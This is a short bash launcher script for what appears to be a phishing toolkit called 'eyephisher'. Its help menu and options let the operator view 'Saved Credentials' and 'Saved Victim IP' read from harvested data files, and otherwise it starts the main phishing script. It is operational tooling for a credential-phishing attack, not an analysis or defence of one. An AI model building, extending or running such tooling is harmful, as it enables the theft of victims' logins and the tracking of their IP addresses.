#!/bin/bash

# https://github.com/joao2015-pbl/eyezhisher

if [[ $(uname -o) == *'Android'* ]];then
	EYEPHISHER_ROOT="/data/data/com.termux/files/usr/opt/eyephisher"
else
	export EYEPHISHER_ROOT="/opt/eyephisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run eyephisher type \`eyephisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $EYEPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $EYEPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $EYEPHISHER_ROOT
	bash ./eyephisher.sh
fi
